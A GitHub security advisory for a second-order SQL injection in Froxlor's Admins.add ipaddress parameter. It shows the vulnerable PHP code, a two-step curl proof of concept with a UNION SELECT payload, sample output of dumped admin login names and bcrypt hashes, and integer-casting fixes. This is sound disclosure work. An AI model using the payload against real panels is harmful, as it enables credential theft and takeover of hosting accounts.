# [H] Froxlor: Second-Order SQL Injection via `Admins.add` `ipaddress` Parameter Allows Full Database Exfiltration

## Summary
Severity: High
Advisory: GHSA-w27m-rmmf-g5w4
CVE: CVE-2026-54348
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-w27m-rmmf-g5w4
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.8

## Details
### Summary

A second-order SQL injection vulnerability in Froxlor's admin API allows an authenticated administrator to store a crafted SQL payload in the `panel_admins.ip` column via the `Admins.add` or `Admins.update` endpoint. The payload executes as a UNION-based SQL injection the next time `IpsAndPorts.listing` is called by the poisoned account, returning arbitrary data from the database — including all administrator login names and bcrypt password hashes.

---

### Details

The vulnerability spans two code locations that form a store-then-trigger chain.

**Stage 1 — Unsanitized array stored as JSON** — `lib/Froxlor/Api/Commands/Admins.php:251,358`

```php
$ipaddress = $this->getParam('ipaddress', true, -1);
// No type enforcement or content validation on $ipaddress.
// PHP evaluates (is_array([...]) && non_empty_array > 0) as true,
// so any attacker-controlled array is JSON-encoded and stored verbatim.
'ip' => empty($ipaddress) ? "" : (is_array($ipaddress) && $ipaddress > 0
    ? json_encode($ipaddress)   // ← attacker payload written to panel_admins.ip
    : -1),
```

The INSERT/UPDATE uses a prepared statement, so the write itself is safe. The danger is what is stored.

**Stage 2 — JSON payload imploded directly into SQL** — `lib/Froxlor/Api/Commands/IpsAndPorts.php:71-77`

```php
if (!empty($this->getUserDetail('ip')) && $this->getUserDetail('ip') != -1) {
    // json_decode restores the array; implode joins elements with no casting or escaping
    $ip_where = "WHERE `id` IN (" . implode(", ", json_decode($this->getUserDetail('ip'), true)) . ")";
}
$result_stmt = Database::prepare(
    "SELECT * FROM `panel_ipsandports` " . $ip_where . ...
);
// Final SQL: SELECT * FROM panel_ipsandports WHERE `id` IN (<PAYLOAD>)
```

The same unsanitized implode pattern exists in `lib/Froxlor/Api/Commands/Domains.php:1016`.

Every other place in the codebase that builds dynamic `IN` clauses uses either integer casting (`(int)`) or parameterized subqueries. The `ip`-column path is the sole exception.

---

### PoC
<img width="2452" height="1476" alt="image" src="https://github.com/user-attachments/assets/2cbff4f8-b316-4a86-95ce-71f5c14d0c95" />



**Prerequisites:** Valid Froxlor admin API key with `change_serversettings = 1`.

**Step 1 — Poison: store the UNION SELECT payload via `Admins.add`**

```bash
curl -s -u "APIKEY:SECRET" http://TARGET/api.php \
  -H "Content-Type: application/json" \
  -d '{
    "command": "Admins.add",
    "params": {
      "name": "x",
      "new_loginname": "eviladmin",
      "email": "x@x.local",
      "admin_password": "Passw0rd!123",
      "ipaddress": ["1) UNION SELECT 1,loginname,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 FROM panel_admins-- -"]
    }
  }'
```

The `ip` column of `panel_admins` for `eviladmin` now contains:
```
["1) UNION SELECT 1,loginname,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 FROM panel_admins-- -"]
```

**Step 2 — Trigger: call `IpsAndPorts.listing` as the poisoned account**

No interaction beyond a single API call. Visiting the following URL while authenticated as `eviladmin` is sufficient:

```
http://TARGET/admin_index.php?page=ipsandports
```

Or directly via API:

```bash
curl -s -u "EVIL_APIKEY:EVIL_SECRET" http://TARGET/api.php \
  -H "Content-Type: application/json" \
  -d '{"command":"IpsAndPorts.listing"}'
```

**Confirmed output from live instance (`localhost:8290`):**

```json
{
  "data": {
    "list": [
      {
        "ip": "admin",
        "port": "$2y$10$uaI/7ZBJtKCSo7CXfNKQuuFXOkJTP/qLhbxLe4yIVSyB90i7i1heu"
      },
      {
        "ip": "eviladmin",
        "port": "$2y$10$KKTbNdFRlsmnYacZOAgRJuRdJy2HOSHqtZW1eSdVw8pWa9xT9wx5S"
      }
    ]
  }
}
```

The `ip` field returns `loginname` and `port` returns the bcrypt password hash of every administrator in the database.

**Minimum reproduction — two CMD single-line commands:**

Step 1: poison (run once with any admin API key that has `change_serversettings=1`):

```cmd
curl -su "APIKEY:SECRET" http://TARGET/api.php -H "Content-Type:application/json" -d "{\"command\":\"Admins.add\",\"params\":{\"name\":\"x\",\"new_loginname\":\"poc\",\"email\":\"x@x.local\",\"admin_password\":\"Passw0rd!1\",\"ipaddress\":[\"1) UNION SELECT 1,loginname,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 FROM panel_admins-- -\"]}}"
```

Step 2: trigger (run with the poisoned account's API key — visiting the page in a browser also suffices):

```cmd
curl -su "POC_APIKEY:POC_SECRET" http://TARGET/api.php -H "Content-Type:application/json" -d "{\"command\":\"IpsAndPorts.listing\"}"
```

**Confirmed output from live instance (`localhost:8290`) — step 2 alone:**

```cmd
curl -su "evil_key_abc123:evil_secret_xyz456" http://localhost:8290/api.php -H "Content-Type:application/json" -d "{\"command\":\"IpsAndPorts.listing\"}"
```

```json
{
  "data": {
    "list": [
      { "ip": "admin",     "port": "$2y$10$uaI/7ZBJtKCSo7CXfNKQuuFXOkJTP/qLhbxLe4yIVSyB90i7i1heu" },
      { "ip": "eviladmin", "port": "$2y$10$KKTbNdFRlsmnYacZOAgRJuRdJy2HOSHqtZW1eSdVw8pWa9xT9wx5S" }
    ]
  }
}
```

---

### Impact

**Type:** Second-Order SQL Injection (UNION-based)

**Who is impacted:** Any Froxlor installation with the API enabled and at least one admin account that has `change_serversettings = 1`. The attack requires an authenticated admin API key, making it relevant in multi-admin deployments (hosting providers with reseller admins) where one admin may be malicious or compromised.

Consequences:

- **Full credential dump** — all admin and customer login names and bcrypt password hashes are extractable in a single request.
- **Lateral movement** — cracked hashes allow login to other admin accounts or customer accounts.
- **Data exfiltration** — the UNION SELECT can target any table in the database: customer data, email accounts, domain configurations, API keys.
- **Privilege escalation** — a reseller admin (limited permissions) can extract the super-admin's credentials and gain full control of the panel.

---

### Fix

**Option A (recommended) — Integer-cast all elements before implode:**

```php
// lib/Froxlor/Api/Commands/IpsAndPorts.php:72
$ip_ids = array_map('intval', json_decode($this->getUserDetail('ip'), true));
$ip_where = "WHERE `id` IN (" . implode(", ", $ip_ids) . ")";
```

**Option B — Validate at storage time in `Admins.add` / `Admins.update`:**

```php
// lib/Froxlor/Api/Commands/Admins.php
if (is_array($ipaddress)) {
    $ipaddress = array_filter($ipaddress, 'is_numeric');
}
'ip' => empty($ipaddress) ? "" : (is_array($ipaddress) && count($ipaddress) > 0
    ? json_encode(array_map('intval', $ipaddress))
    : -1),
```

Apply the same fix to the identical pattern in `Domains.php:1016`.

---

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-w27m-rmmf-g5w4
- https://github.com/froxlor/froxlor/commit/a1eaca5a1601c8a30e00814a4fc73ad0c185f89e
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.8
